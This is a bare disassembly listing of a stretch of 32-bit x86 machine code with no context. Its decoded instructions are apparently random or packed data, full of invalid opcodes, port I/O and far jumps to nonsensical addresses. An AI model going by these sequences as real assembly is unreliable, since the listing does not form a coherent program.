  403129:	pop    esp
  40312a:	rol    edi,0x94
  40312d:	je     0x403111
  40312f:	sub    edx,DWORD PTR [eax+0x24]
  403132:	dec    DWORD PTR [edi+0x7d]
  403135:	in     al,0xd5
  403137:	hlt    
  403138:	test   BYTE PTR [edx+esi*4],al
  40313b:	pop    ecx
  40313c:	xor    ax,0xb880
  403140:	jle    0x4030c2
  403142:	out    dx,eax
  403143:	test   al,0x62
  403145:	jp     0x4031be
  403147:	cli    
  403148:	es pop ecx
  40314a:	inc    edi
  40314b:	int3   
  40314c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40314d:	push   edx
  40314e:	or     ecx,DWORD PTR [edx]
  403150:	out    dx,eax
  403151:	sub    ah,cl
  403153:	imul   esp,DWORD PTR [ebp-0x208c1b26],0x87b08348
  40315d:	xchg   edx,eax
  40315e:	inc    eax
  40315f:	fs or  eax,0x1c698bbb
  403165:	push   es
  403166:	dec    ebp
  403167:	aad    0xd6
  403169:	push   ebp
  40316a:	add    eax,0x8057f6cf
  40316f:	xchg   ebx,eax
  403170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403171:	adc    bl,dl
  403173:	and    BYTE PTR [edi],bh
  403175:	xchg   ebp,eax
  403176:	and    esi,edx
  403178:	pop    ecx
  403179:	dec    esi
  40317a:	mov    ecx,0x4078aa2d
  40317f:	xchg   edi,eax
  403180:	mov    dh,BYTE PTR [edx-0x52d512ee]
  403186:	adc    DWORD PTR [bx],esp
  403189:	shr    DWORD PTR [eax],1
  40318b:	mov    edx,0xde6e1707
  403190:	dec    eax
  403191:	es jl  0x4031a9
  403194:	mov    al,BYTE PTR [eax-0x7d]
  403197:	addr16 mov ecx,0x114c8bf3
  40319d:	jmp    0xfd131958
  4031a2:	mov    ds:0x10846fb8,al
  4031a7:	call   0x7cb992f9
  4031ac:	test   al,0x7d
  4031ae:	dec    ebx
  4031af:	scas   al,BYTE PTR es:[edi]
  4031b0:	cdq    
  4031b1:	push   cs
  4031b2:	sbb    eax,0x93f41496
  4031b7:	cmp    al,0xa0
  4031b9:	mov    ch,0xfe
  4031bb:	jecxz  0x40317e
  4031bd:	push   ebp
  4031be:	jmp    0xa1dc:0xa631505b
  4031c5:	push   0x3f
  4031c7:	fist   WORD PTR [ebx+0x49c4f5ed]
  4031cd:	loop   0x403223
  4031cf:	fs ins BYTE PTR es:[edi],dx
  4031d1:	jne    0x4031c9
  4031d3:	sub    al,0x24
  4031d5:	adc    edi,esp
  4031d7:	dec    ebx
  4031d8:	sti    
  4031d9:	push   cs
  4031da:	dec    edx
  4031db:	mov    BYTE PTR [ebp-0x1eb8a724],bl
  4031e1:	cdq    
  4031e2:	mov    ch,0xbe
  4031e4:	mov    esp,0xadbb27a6
  4031e9:	adc    al,0x2a
  4031eb:	mov    ch,0x46
  4031ed:	fmul   DWORD PTR [ebp+0x54]
  4031f0:	dec    ecx
  4031f1:	push   edx
  4031f2:	cmp    eax,0x9f854b
  4031f7:	dec    ebx
  4031f8:	jbe    0x403190
  4031fa:	mov    ds:0xc751028,eax
  4031ff:	xchg   esi,eax
  403200:	push   es
  403201:	push   edi
  403202:	sub    ah,bh
  403204:	icebp  
  403205:	push   ecx
  403206:	enter  0x9436,0xc
  40320a:	pusha  
  40320b:	add    esp,DWORD PTR [ecx]
  40320d:	enter  0xdb31,0x83
  403211:	imul   esp,DWORD PTR [edx-0x11711860],0xffffffbe
  403218:	cmove  eax,DWORD PTR [edx+0x4f]
  40321c:	jb     0x40321d
  40321e:	mov    ds:0x285cd0fa,eax
  403223:	jp     0x403297
  403225:	ss cmc 
  403227:	ja     0x40320c
  403229:	arpl   WORD PTR [esi+eiz*1],sp
  40322c:	outs   dx,BYTE PTR ss:[esi]
  40322e:	inc    esp
  40322f:	xor    eax,0xb78b58fd
  403234:	shr    BYTE PTR [esi+ebp*2-0x77],1
  403238:	loope  0x403263
  40323a:	fldenv [ebx-0x24]
  40323d:	cmp    ah,bl
  40323f:	ds mov ?,edi
  403242:	push   ecx
  403243:	sahf   
  403244:	ret    0x6546
  403247:	inc    esp
  403248:	into   
  403249:	es or  edi,edi
  40324c:	inc    esp
  40324d:	or     al,0x93
  40324f:	data16 not BYTE PTR [edi+esi*4-0x60]
  403254:	sub    eax,0x5319f20d
  403259:	fiadd  DWORD PTR [eax]
  40325b:	loop   0x403299
  40325d:	push   esi
  40325e:	pop    ebp
  40325f:	inc    esi
  403260:	cmp    eax,0x499852f8
  403265:	xchg   DWORD PTR [edx+edx*1+0x73],ecx
  403269:	inc    esi
  40326a:	xchg   ebp,eax
  40326b:	push   ebp
  40326c:	cdq    
  40326d:	mov    ebx,DWORD PTR [esp+edi*1]
  403270:	cmp    al,0xad
  403272:	fucomip st,st(6)
  403274:	addr16 or esi,esi
  403277:	rcr    ebx,1
  403279:	jg     0x403240
  40327b:	adc    eax,0xc0a412cb
  403280:	jnp    0x4032bf
  403282:	ret    
  403283:	xor    eax,DWORD PTR [ecx+0x6b5d75c8]
  403289:	sbb    bh,BYTE PTR ds:0xb6a743b6
  40328f:	sbb    BYTE PTR [ebx+0xa],bl
  403292:	or     dh,BYTE PTR [edx+0x3889f694]
  403298:	test   BYTE PTR [ebx+0x1c],0x10
  40329c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40329d:	pusha  
  40329e:	or     al,0xeb
  4032a0:	dec    ebx
  4032a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032a2:	leave  
  4032a3:	sub    BYTE PTR [esi-0x33467aa3],bh
  4032a9:	push   edx
  4032aa:	mov    ds:0x6c369d2f,al
  4032af:	and    DWORD PTR [esi],0xffffffc7
  4032b2:	jns    0x403307
  4032b4:	xchg   edx,eax
  4032b5:	mov    dl,0x5e
  4032b7:	mov    WORD PTR [ebp+0x7c084c78],?
  4032bd:	int3   
  4032be:	popf   
  4032bf:	mov    cl,0xd7
  4032c1:	mov    ds:0x61669543,eax
  4032c6:	(bad)  
  4032c7:	xor    bh,ch
  4032c9:	or     ebx,DWORD PTR [ebx+edi*1-0x80]
  4032cd:	pop    esi
  4032ce:	push   eax
  4032cf:	call   0x5b48:0x4cfa3668
  4032d6:	xlat   BYTE PTR ds:[ebx]
  4032d7:	or     DWORD PTR [esi+0x4e],esi
  4032da:	lea    eax,[eax+0x65]
  4032dd:	ss dec ecx
  4032df:	xor    DWORD PTR [eax+0x3e38993f],edx
  4032e5:	or     eax,0x24c347ec
  4032ea:	add    esi,DWORD PTR [esi+0x28]
  4032ed:	xchg   cl,ah
  4032ef:	push   ebp
  4032f0:	jne    0x403315
  4032f2:	jge    0x4032f3
  4032f4:	push   es
  4032f5:	inc    ecx
  4032f6:	out    dx,eax
  4032f7:	(bad)  [ebp-0x5f641039]
  4032fd:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4032ff:	(bad)  
  403300:	rcl    BYTE PTR [ebp-0x4b5da6c5],0x5a
  403307:	addr16 es ret 0xd4d5
  40330c:	pop    edx
  40330d:	ret    
  40330e:	ins    DWORD PTR es:[edi],dx
  40330f:	sub    esi,DWORD PTR [ebp-0x76cafefc]
  403315:	pop    esp
  403316:	fnsave [ecx-0x48]
  403319:	jno    0x403311
  40331b:	mov    edi,0x9f2bce5
  403320:	(bad)  
  403321:	cmp    BYTE PTR [eax+0x47],ch
  403324:	fsub   QWORD PTR [ebx]
  403326:	(bad)  
  403327:	mov    ah,0x5e
  403329:	sahf   
  40332a:	inc    ebp
  40332b:	mov    ds:0xfc18a061,eax
  403330:	adc    al,0x72
  403332:	pushf  
  403333:	ss loope 0x403368
  403336:	jmp    0x6428d0f2
  40333b:	xor    ecx,DWORD PTR [ecx+eax*1]
  40333e:	and    bh,cl
  403340:	ret    
  403341:	jmp    0x40335d
  403343:	into   
  403344:	xchg   edi,eax
  403345:	bound  eax,QWORD PTR [edi-0x62dbc915]
  40334b:	outs   dx,DWORD PTR ds:[esi]
  40334c:	bound  ecx,QWORD PTR [ebx+0x755949d8]
  403352:	and    cl,cl
  403354:	cmp    eax,0x269ada95
  403359:	aam    0x7f
  40335b:	out    0x6b,al
  40335d:	jae    0x40335c
  40335f:	idiv   DWORD PTR [eax]
  403361:	mov    DWORD PTR ds:0x3b67b89d,ebx
  403367:	mov    BYTE PTR [edi+0x23],dh
  40336a:	mov    al,0x46
  40336c:	add    BYTE PTR [eax+ecx*1+0x5dae2723],cl
  403373:	imul   edx,DWORD PTR [edi+0x66],0x89a2dc77
  40337a:	mov    ?,ebx
  40337c:	pop    ss
  40337d:	xchg   ebp,eax
  40337e:	xor    ebp,DWORD PTR [esi+0x76e2cebe]
  403384:	ins    DWORD PTR es:[edi],dx
  403385:	lods   eax,DWORD PTR ds:[esi]
  403386:	push   cs
  403387:	xlat   BYTE PTR ds:[ebx]
  403388:	inc    esp
  403389:	retf   
  40338a:	xchg   BYTE PTR gs:[ecx-0x2a29e5a1],al
  403391:	out    dx,al
  403392:	call   0xef92:0x587a949b
  403399:	fmul   st,st(7)
  40339b:	fdiv   QWORD PTR [ecx+0x37]
  40339e:	jnp    0x403321
  4033a0:	sahf   
  4033a1:	inc    ecx
  4033a2:	or     al,0x12
  4033a4:	dec    edx
  4033a5:	lahf   
  4033a6:	push   edi
  4033a7:	mov    ah,0x4f
  4033a9:	mov    ds:0x5d2dca72,eax
  4033ae:	lock gs cs (bad) {k4}
  4033b6:	(bad)  
  4033b8:	adc    eax,0xecef3a95
  4033bd:	cmp    DWORD PTR [ecx+ebp*2],esi
  4033c0:	sbb    dl,BYTE PTR [eax-0x16]
  4033c3:	pop    esi
  4033c4:	ds inc eax
  4033c6:	fisub  WORD PTR ds:0xe8251550
  4033cc:	(bad)  
  4033cd:	gs add eax,0xf9299fce
  4033d3:	jns    0x403423
  4033d5:	jmp    0x19a62acb
  4033da:	jecxz  0x403456
  4033dc:	or     eax,0x21f7fa88
  4033e1:	mov    esi,0x4cc8a7f4
  4033e6:	mov    dh,BYTE PTR [ebp+0x1d036024]
  4033ec:	out    0x87,eax
  4033ee:	lods   eax,DWORD PTR ds:[esi]
  4033ef:	int    0x11
  4033f1:	mov    ds:0xd22a2ed,al
  4033f6:	xchg   ax,ax
  4033f8:	pop    ebp
  4033f9:	pop    di
  4033fb:	clc    
  4033fc:	test   BYTE PTR [ecx],ch
  4033fe:	push   ss
  4033ff:	and    al,0x36
  403401:	add    al,0x63
  403403:	call   0x89b5d561
  403408:	repz aam 0xcf
  40340b:	mov    DWORD PTR [eax-0x63],esp
  40340e:	jne    0x40347d
  403410:	xor    ecx,DWORD PTR [ebp+0x55]
  403413:	imul   dh
  403415:	sbb    DWORD PTR [eax-0x15],esp
  403418:	mov    eax,0xd91a327
  40341d:	scas   eax,DWORD PTR es:[edi]
  40341e:	nop
  40341f:	loope  0x4033df
  403421:	xchg   edi,eax
  403422:	sub    eax,DWORD PTR [esi-0x76094691]
  403428:	or     dl,bh
  40342a:	cmp    al,0x44
  40342c:	je     0x4033ff
  40342e:	mov    bl,0x4f
  403430:	lods   eax,DWORD PTR ds:[esi]
  403431:	xchg   BYTE PTR [edx+0x40a88301],bl
  403437:	aaa    
  403438:	mov    bl,0xd2
  40343a:	push   0xffffffcc
  40343c:	mov    dl,0x2e
  40343e:	cs int 0x83
  403441:	mov    al,ds:0x7f0db6cb
  403446:	or     al,0x7
  403448:	out    dx,al
  403449:	stc    
  40344a:	in     eax,dx
  40344b:	stc    
  40344c:	dec    ebp
  40344d:	bound  edx,QWORD PTR [ebp-0x19]
  403450:	cmp    al,0xcc
  403452:	cmp    DWORD PTR [eax+eax*8+0x6a719676],ebp
  403459:	xor    dl,bl
  40345b:	jle    0x40349f
  40345d:	sbb    eax,0x3b98ee3e
  403462:	icebp  
  403463:	test   eax,0x9953d977
  403468:	ret    
  403469:	xchg   esi,eax
  40346a:	mov    eax,ds:0xff0c04c9
  40346f:	(bad)  
  403471:	mov    dh,BYTE PTR [ebp-0x1e]
  403474:	pop    esp
  403475:	dec    ebx
  403476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403477:	int3   
  403478:	repnz mov edi,0x8e27d342
  40347e:	and    eax,0xcb7ae874
  403483:	pop    esi
  403484:	mov    esp,0x5a01b59e
  403489:	lods   al,BYTE PTR ds:[esi]
  40348a:	jbe    0x4034f2
  40348c:	in     eax,0x78
  40348e:	inc    ecx
  40348f:	sbb    BYTE PTR [eax+0x29760356],dh
  403495:	dec    ecx
  403496:	loop   0x4034bc
  403498:	pop    ecx
  403499:	add    bl,dh
  40349b:	les    ecx,FWORD PTR [ebp+0x36c7d94d]
  4034a1:	xchg   esp,eax
  4034a2:	(bad)  
  4034a3:	xor    al,ah
  4034a5:	out    0xc4,al
  4034a7:	in     ax,dx
  4034a9:	popf   
  4034aa:	sahf   
  4034ab:	jae    0x403442
  4034ad:	pop    ebp
  4034ae:	inc    esi
  4034af:	sahf   
  4034b0:	push   edi
  4034b1:	ins    DWORD PTR es:[edi],dx
  4034b2:	bound  edi,QWORD PTR [ebp+0x3f]
  4034b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b7:	xchg   esi,eax
  4034b8:	retf   
  4034b9:	mov    esi,0xb3ab01ec
  4034be:	pop    ss
  4034bf:	push   ecx
  4034c0:	and    eax,0xaa0d3e03
  4034c5:	in     eax,0xe3
  4034c7:	aaa    
  4034c8:	mov    ch,0x9d
  4034ca:	jmp    FWORD PTR [esi+0x5d]
  4034cd:	arpl   WORD PTR [edi-0x71954cb4],si
  4034d3:	push   esp
  4034d4:	aas    
  4034d5:	cmp    al,0x7a
  4034d7:	adc    dh,BYTE PTR [ebx+0x2]
  4034da:	and    al,0xc5
  4034dc:	cmp    bh,ch
  4034de:	outs   dx,DWORD PTR ds:[esi]
  4034df:	lea    ebp,[edx-0x3e5764ca]
  4034e5:	loope  0x4034c8
  4034e7:	xchg   ebx,eax
  4034e8:	les    ecx,FWORD PTR [edi+eiz*4+0x1b]
  4034ec:	pop    es
  4034ed:	not    BYTE PTR [ebx-0x4f]
  4034f0:	das    
  4034f1:	push   ebx
  4034f2:	adc    eax,0x83601c3
  4034f7:	pop    edx
  4034f8:	mov    eax,0x9442aec8
  4034fd:	mov    WORD PTR [eax+0x66],ds
  403500:	popa   
  403501:	mov    ebp,0xb35b4611
  403506:	mov    eax,ds:0x26f7c92e
  40350b:	addr16 iret 
  40350d:	sbb    eax,0xc5450912
  403512:	push   ecx
  403513:	inc    edi
  403514:	addr16 and al,0xfd
  403517:	xchg   BYTE PTR [edx],bl
  403519:	cmp    eax,0xcc34037d
  40351e:	retf   
  40351f:	cdq    
  403520:	or     al,0x7a
  403522:	xor    DWORD PTR [esi+0x213a2422],ebp
  403528:	xor    ebx,esi
  40352a:	push   ss
  40352b:	pop    esi
  40352c:	sbb    dh,bh
  40352e:	sbb    al,0x9e
  403530:	es stc 
  403532:	mov    bl,0xe5
  403534:	mov    ch,0xfc
  403536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403537:	dec    eax
  403538:	cmp    ch,BYTE PTR [ecx+0x45]
  40353b:	ss cmc 
  40353d:	mov    esp,0xcaf72223
  403542:	dec    esi
  403543:	add    al,0x27
  403545:	add    eax,0x4740df4e
  40354a:	lods   eax,DWORD PTR ds:[esi]
  40354b:	xlat   BYTE PTR ds:[ebx]
  40354c:	test   al,0x96
  40354e:	out    0x4e,al
  403550:	in     al,dx
  403551:	test   eax,0x25daf151
  403556:	addr16 mov edi,0xee2a2d6f
  40355c:	push   0x49
  40355e:	dec    ebx
  40355f:	repz pushf 
  403561:	call   0x38aa723e
  403566:	and    BYTE PTR ds:0xfcfa6e2,ah
  40356c:	aad    0x2f
  40356e:	fstp   QWORD PTR [esi+0x6f]
  403571:	lods   al,BYTE PTR ds:[esi]
  403572:	xor    edi,esi
  403574:	mov    WORD PTR [ecx+ecx*1],cs
  403577:	repz fcomp DWORD PTR [edi]
  40357a:	(bad)  
  40357b:	mov    ds:0x58a87c69,eax
  403580:	add    DWORD PTR [eax],ebp
  403582:	aas    
  403583:	repz sbb eax,0x16646eed
  403589:	lods   eax,DWORD PTR ds:[esi]
  40358a:	repz lea eax,[ebx+0x6a]
  40358e:	aaa    
  40358f:	outs   dx,DWORD PTR ds:[esi]
  403590:	dec    edx
  403591:	lock xor BYTE PTR [ebx],dh
  403594:	vpsllw ymm5,ymm5,XMMWORD PTR ds:0x15311a31
  40359c:	out    0xef,al
  40359e:	mov    es,WORD PTR [edx+0x7]
  4035a1:	and    DWORD PTR [ebx],eax
  4035a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035a4:	leave  
  4035a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035a6:	sbb    ah,BYTE PTR [ecx]
  4035a8:	adc    BYTE PTR [esp+eax*4],bh
  4035ab:	std    
  4035ac:	pop    esi
  4035ad:	test   al,0xcd
  4035af:	xor    eax,ebp
  4035b1:	int    0x75
  4035b3:	cmp    esi,DWORD PTR [esi+0x3028c8b0]
  4035b9:	mov    ds:0xb7b1087c,eax
  4035be:	xor    ah,ah
  4035c0:	enter  0xb22c,0x1c
  4035c4:	inc    ecx
  4035c5:	fst    st(3)
  4035c7:	sbb    DWORD PTR [ecx-0x5c],esp
  4035ca:	das    
  4035cb:	pop    DWORD PTR [ecx-0x177180a]
  4035d1:	push   es
  4035d2:	enter  0x22a1,0xdf
  4035d6:	add    ch,cl
  4035d8:	mov    ds:0xb2047441,eax
  4035dd:	outs   dx,DWORD PTR ds:[esi]
  4035de:	ins    BYTE PTR es:[edi],dx
  4035df:	pop    edx
  4035e0:	sub    esp,esi
  4035e2:	xchg   ecx,eax
  4035e3:	cmc    
  4035e4:	sub    eax,0xafd23409
  4035e9:	pop    esi
  4035ea:	and    al,0x96
  4035ec:	cmp    BYTE PTR [ecx],bl
  4035ee:	in     eax,0x6f
  4035f0:	sub    al,0xf7
  4035f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035f3:	into   
  4035f4:	push   esp
  4035f5:	(bad)  
  4035f7:	inc    edx
  4035f8:	rcl    DWORD PTR [edi+0x1f],1
  4035fb:	outs   dx,BYTE PTR ds:[esi]
  4035fc:	dec    esp
  4035fd:	fwait
  4035fe:	fwait
  4035ff:	jne    0x403635
  403601:	sub    BYTE PTR [edx-0x58],0x18
  403605:	push   cs
  403606:	inc    eax
  403607:	jl     0x40358f
  403609:	lds    esi,FWORD PTR [esp+ebx*8-0x36938100]
  403610:	cdq    
  403611:	fcomp  QWORD PTR [ecx]
  403613:	leave  
  403614:	test   al,0xcb
  403616:	(bad)  
  403617:	adc    cl,BYTE PTR [ebx]
  403619:	pushf  
  40361a:	test   al,0xaf
  40361c:	cld    
  40361d:	mov    ?,WORD PTR [edi-0x11]
  403620:	xor    bh,BYTE PTR [edi-0x432ccff8]
  403626:	in     al,0x36
  403628:	jbe    0x4035c8
  40362a:	nop
  40362b:	sbb    ebx,DWORD PTR [eax+ebp*1-0x2d]
  40362f:	dec    edi
  403630:	mov    edi,0x6d25a676
  403635:	xor    eax,0xcfa0c29e
  40363a:	sahf   
  40363b:	iret   
  40363c:	not    ah
  40363e:	(bad)  
  40363f:	mov    esi,0x48b4553e
  403644:	sbb    eax,0x9d24d210
  403649:	frstor [esi-0x1b]
  40364c:	mov    cl,0x43
  40364e:	sbb    DWORD PTR [eax+0x5aedb057],esi
  403654:	add    BYTE PTR [edx+0x7e],dl
  403657:	jmp    0x403612
  403659:	leave  
  40365a:	retf   0x33d9
  40365d:	inc    edx
  40365e:	lahf   
  40365f:	push   edx
  403660:	push   ss
  403661:	jo     0x40360f
  403663:	jbe    0x403671
  403665:	lods   eax,DWORD PTR ds:[esi]
  403666:	retf   0xf7e0
  403669:	fistp  DWORD PTR ds:0x1090b8f8
  40366f:	dec    ecx
  403670:	jmp    0x2043db10
  403675:	add    al,0xdd
  403677:	cmp    eax,0x7d481422
  40367c:	inc    ebx
  40367d:	fnstenv [ecx-0x55]
  403680:	sahf   
  403681:	aaa    
  403682:	dec    eax
  403683:	push   bp
  403685:	push   es
  403686:	sub    dh,bl
  403688:	jmp    0x403615
  40368a:	cmp    ebx,ecx
  40368c:	mov    cl,0x6
  40368e:	push   ebx
  40368f:	sub    ebx,esp
  403691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403692:	adc    eax,0xf29195d7
  403697:	(bad)  
  403698:	cld    
  403699:	xchg   ebx,eax
  40369b:	xor    ah,bh
  40369d:	cmc    
  40369e:	aas    
  40369f:	lock out 0x1c,al
  4036a2:	imul   ebx,DWORD PTR [eax-0x3a],0xea11a1e7
  4036a9:	sub    bl,al
  4036ab:	xchg   ebx,eax
  4036ac:	das    
  4036ad:	mov    eax,ds:0xd26f4ead
  4036b2:	leave  
  4036b3:	inc    ebp
  4036b4:	mov    cl,0x12
  4036b6:	lea    esp,[edi-0x2dd11c6b]
  4036bc:	inc    ebp
  4036bd:	popa   
  4036be:	aas    
  4036bf:	jbe    0x40371c
  4036c1:	sub    al,0x17
  4036c3:	test   al,0x19
  4036c5:	sbb    eax,0xe2f17ddb
  4036ca:	in     al,dx
  4036cb:	cs inc eax
  4036cd:	cmp    ebp,DWORD PTR [esi]
  4036cf:	shl    cl,1
  4036d1:	mov    ebp,es
  4036d3:	sbb    DWORD PTR [ecx+eiz*1+0x1f],0x65d8ee12
  4036db:	sar    BYTE PTR [esi+eiz*8],0x96
  4036df:	sbb    ah,BYTE PTR [edi-0x39]
  4036e2:	or     edx,DWORD PTR [ebx+0x7e]
  4036e5:	pop    es
  4036e6:	sbb    al,0xb8
  4036e8:	xchg   edx,eax
  4036e9:	inc    ebx
  4036ea:	mov    dh,0xc
  4036ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036ed:	pop    edx
  4036ee:	bound  ebp,QWORD PTR [esi+0x3e]
  4036f1:	repnz ins BYTE PTR es:[edi],dx
  4036f3:	pop    ecx
  4036f4:	fistp  QWORD PTR [ebx]
  4036f6:	lods   eax,DWORD PTR ds:[esi]
  4036f7:	mov    edx,0x2ef59966
  4036fc:	adc    al,0xa9
  4036fe:	jnp    0x403732
  403700:	into   
  403701:	lods   al,BYTE PTR ds:[esi]
  403702:	fadd   QWORD PTR [ecx-0x57e86af9]
  403708:	xchg   esi,eax
  403709:	mov    bl,0xb7
  40370b:	or     BYTE PTR [edx-0x14bbd13f],dh
  403711:	popf   
  403712:	jns    0x4036ff
  403714:	adc    DWORD PTR [esi+0x20],0xfffffff1
  403718:	addr16 add eax,0x66eb15b8
  40371e:	hlt    
  40371f:	inc    edx
  403720:	xor    al,0x4c
  403722:	hlt    
  403723:	mov    bl,0xe5
  403725:	or     eax,DWORD PTR [edx-0x73b7f62]
  40372b:	dec    edi
  40372c:	sti    
  40372d:	push   ds
  40372e:	in     eax,dx
  40372f:	pop    edx
  403730:	popf   
  403731:	ds scas al,BYTE PTR es:[edi]
  403733:	mov    dh,0x39
  403735:	xchg   ebx,eax
  403736:	arpl   WORD PTR [edx-0x755b02bc],sp
  40373c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40373d:	jl     0x403703
  40373f:	in     eax,dx
  403740:	repnz ud2 
  403743:	loope  0x403717
  403745:	mov    eax,ds:0x93580c46
  40374a:	xor    DWORD PTR [edx],esi
  40374c:	clc    
  40374d:	clc    
  40374e:	js     0x4037ba
  403750:	and    DWORD PTR [esp+eax*1-0x2],edi
  403754:	jmp    FWORD PTR [ecx+ebx*1]
  403757:	fdiv   QWORD PTR [ebx]
  403759:	jns    0x40379f
  40375b:	scas   eax,DWORD PTR es:[edi]
  40375c:	sbb    ecx,DWORD PTR [edx+0x1c991c5c]
  403762:	pop    ebp
  403763:	xchg   ecx,eax
  403764:	xor    ebx,ebx
  403766:	dec    ebp
  403767:	test   DWORD PTR ds:0x652c3ef1,esp
  40376d:	ret    
  40376e:	mov    ds:0x1d04ef08,eax
  403773:	dec    esi
  403774:	outs   dx,BYTE PTR ds:[esi]
  403775:	nop
  403776:	jl     0x403744
  403778:	mov    ebp,0x1d0e65c0
  40377d:	push   esi
  40377e:	jecxz  0x403710
  403780:	dec    ecx
  403781:	stc    
  403782:	hlt    
  403783:	sbb    eax,0xa950c0a2
  403788:	(bad)  
  403789:	mov    bh,0xf6
  40378b:	fisub  DWORD PTR [ebx+0x5c]
  40378e:	(bad)  
  40378f:	pushf  
  403790:	cdq    
  403791:	jne    0x40377e
  403793:	jle    0x4037df
  403795:	sub    BYTE PTR [esi-0x71],ah
  403798:	cmc    
  403799:	(bad)  
  40379a:	out    dx,eax
  40379b:	aam    0xf5
  40379d:	jmp    0x6b5a:0x6e16a477
  4037a4:	inc    edx
  4037a5:	in     eax,dx
  4037a6:	into   
  4037a7:	cmp    eax,0x84acf22c
  4037ac:	loop   0x40376c
  4037ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037af:	test   al,0xb2
  4037b1:	aad    0x44
  4037b3:	add    eax,ebp
  4037b5:	repnz and al,0x9a
  4037b8:	lea    esp,[edi-0x47e99b40]
  4037be:	sub    eax,0xff034cc3
  4037c3:	std    
  4037c4:	addr16 (bad) 
  4037c6:	ss lahf 
  4037c8:	sub    edi,DWORD PTR [eax-0x2d]
  4037cb:	cli    
  4037cc:	xor    BYTE PTR [eax-0x29],ah
  4037cf:	dec    eax
  4037d0:	cmp    eax,0xd99d1aca
  4037d5:	push   eax
  4037d6:	pop    ecx
  4037d7:	mov    edi,0xdeb269f0
  4037dc:	jns    0x46efecd9
  4037e2:	stos   BYTE PTR es:[edi],al
  4037e3:	leave  
  4037e4:	sub    BYTE PTR [edi+0x15504e67],bh
  4037ea:	mov    dl,cl
  4037ec:	pushf  
  4037ed:	out    dx,al
  4037ee:	ja     0x40378e
  4037f0:	xor    esp,esp
  4037f2:	dec    ebp
  4037f3:	jmp    0xbf18b352
  4037f8:	push   eax
  4037f9:	int    0x55
  4037fb:	fimul  DWORD PTR [ebp-0x456fb1bf]
  403801:	xchg   esi,eax
  403802:	popa   
  403803:	pop    ecx
  403804:	into   
  403805:	push   ds
  403806:	sbb    al,0x93
  403808:	pop    esi
  403809:	stos   BYTE PTR es:[edi],al
  40380a:	add    eax,0x866f908a
  40380f:	arpl   sp,di
  403811:	pusha  
  403812:	repz cdq 
  403814:	retf   
  403815:	std    
  403816:	(bad)  
  403817:	jno    0x40382e
  403819:	push   es
  40381a:	hlt    
  40381b:	mov    dh,0xf9
  40381d:	mov    ebx,0xd411d2b6
  403822:	mov    ?,WORD PTR [ecx+0x8e00818]
  403828:	imul   edi,DWORD PTR [ebx-0x472c68ef],0xd83c52ea
  403832:	push   edi
  403833:	(bad)  
  403834:	fild   WORD PTR [ecx+0x16354115]
  40383a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40383b:	es cmc 
  40383d:	repnz sbb DWORD PTR [edi-0x4b389155],ecx
  403844:	rep lods al,BYTE PTR ds:[esi]
  403846:	inc    esp
  403847:	sti    
  403848:	mov    al,ds:0x62f66ccb
  40384d:	loope  0x4038c2
  40384f:	(bad)  
  403850:	and    al,0xeb
  403852:	clc    
  403853:	out    dx,eax
  403854:	push   ebx
  403855:	dec    ebx
  403856:	out    0x6e,eax
  403858:	mov    ah,0x32
  40385a:	data16 icebp 
  40385c:	ds cld 
  40385e:	enter  0xfd6,0x7e
  403862:	add    eax,0xcc004cca
  403867:	add    eax,0xef96b17c
  40386c:	ja     0x403844
  40386e:	mov    fs,WORD PTR [eax-0x35]
  403871:	js     0x40387b
  403873:	and    ah,BYTE PTR ds:0xddafca4a
  403879:	imul   edx,ecx,0xffffffc0
  40387c:	sub    BYTE PTR [ebp+ecx*2-0x59],0x6b
  403881:	mov    edi,0x2c53dfa0
  403886:	add    eax,0xb8a47c7e
  40388b:	cld    
  40388c:	add    BYTE PTR [ebp+0x74bbb168],al
  403892:	push   cs
  403893:	add    BYTE PTR [esi],ah
  403895:	jmp    0x2c3d:0x6e4c5542
  40389c:	jbe    0x4038cd
  40389e:	ins    DWORD PTR es:[edi],dx
  40389f:	repz pop ecx
  4038a1:	inc    ebx
  4038a2:	je     0x4038c6
  4038a4:	jl     0x403893
  4038a6:	fwait
  4038a7:	xor    al,0x1a
  4038a9:	in     al,dx
  4038aa:	rcr    DWORD PTR [esi-0x6b],1
  4038ad:	mov    dl,0x82
  4038af:	adc    al,0x0
  4038b1:	gs stos DWORD PTR es:[edi],eax
  4038b3:	aam    0x45
  4038b5:	int    0xb6
  4038b7:	xor    cl,BYTE PTR [ebp+0xd]
  4038ba:	adc    eax,0xcfd5bcbf
  4038bf:	cmp    eax,0x95429996
  4038c4:	call   0x65fb:0x61511380
  4038cb:	daa    
  4038cc:	popa   
  4038cd:	adc    bh,BYTE PTR gs:[edi-0x3188f310]
  4038d4:	cli    
  4038d5:	mov    bl,0x91
  4038d7:	(bad)  
  4038d8:	push   ecx
  4038d9:	stos   BYTE PTR es:[edi],al
  4038da:	or     bl,ah
  4038dc:	(bad)  
  4038dd:	clc    
  4038de:	popa   
  4038df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038e0:	ins    BYTE PTR es:[edi],dx
  4038e1:	push   es
  4038e2:	repz loope 0x40395d
  4038e5:	push   edx
  4038e6:	mov    ah,0x15
  4038e8:	int    0xff
  4038ea:	mov    cl,0x2c
  4038ec:	ins    DWORD PTR es:[edi],dx
  4038ed:	jne    0x403893
  4038ef:	or     eax,0xaeb3c826
  4038f4:	push   edi
  4038f5:	xor    dh,dh
  4038f7:	dec    esi
  4038f8:	pushf  
